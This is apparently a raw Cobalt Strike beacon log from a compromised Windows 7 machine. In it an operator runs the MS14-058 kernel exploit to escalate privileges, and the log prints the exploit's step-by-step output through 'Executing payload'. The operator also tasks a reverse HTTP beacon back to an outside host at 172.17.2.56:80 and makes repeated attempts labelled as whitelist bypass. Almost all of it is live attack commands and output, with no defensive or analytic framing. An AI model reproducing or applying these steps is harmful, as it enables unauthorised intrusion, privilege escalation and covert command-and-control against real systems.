01/27 14:15:32 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 1612; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/27 14:15:39 [input] <neo> elevate ms14-058 test
01/27 14:15:39 [task] Tasked beacon to run windows/beacon_http/reverse_http (172.17.2.56:80) via ms14-058
01/27 14:16:26 [checkin] host called home, sent: 104503 bytes
01/27 14:16:27 [output]
received output:
[*] Getting Windows version...
[*] Solving symbols...
[*] Requesting Kernel loaded modules...
[*] pZwQuerySystemInformation required length 43224
[*] Parsing SYSTEM_INFO...
[*] 146 Kernel modules found
[*] Checking module \SystemRoot\system32\ntoskrnl.exe
[*] Good! nt found as ntoskrnl.exe at 0x03c15000
[*] ntoskrnl.exe loaded in userspace at: 40000000
[*] pPsLookupProcessByProcessId in kernel: 0xFFFFF80003F681FC
[*] pPsReferencePrimaryToken in kernel: 0xFFFFF80003F6B9D0
[*] Registering class...
[*] Creating window...
[*] Allocating null page...
[*] Getting PtiCurrent...
[*] Good! dwThreadInfoPtr 0xFFFFF900C3631C30
[*] Creating a fake structure at NULL...
[*] Triggering vulnerability...
[!] Executing payload...


01/27 15:06:17 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 1612; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/27 16:04:31 [task] 4************白名单绕过*************
01/27 16:05:11 [checkin] host called home, sent: 79 bytes
01/27 16:08:50 [task] 4************白名单绕过*************
01/27 16:09:21 [checkin] host called home, sent: 79 bytes
01/27 16:13:09 [task] 4************白名单绕过*************
01/27 16:13:22 [checkin] host called home, sent: 78 bytes
01/27 16:44:26 [task] 4************白名单绕过*************
01/27 16:44:33 [checkin] host called home, sent: 80 bytes
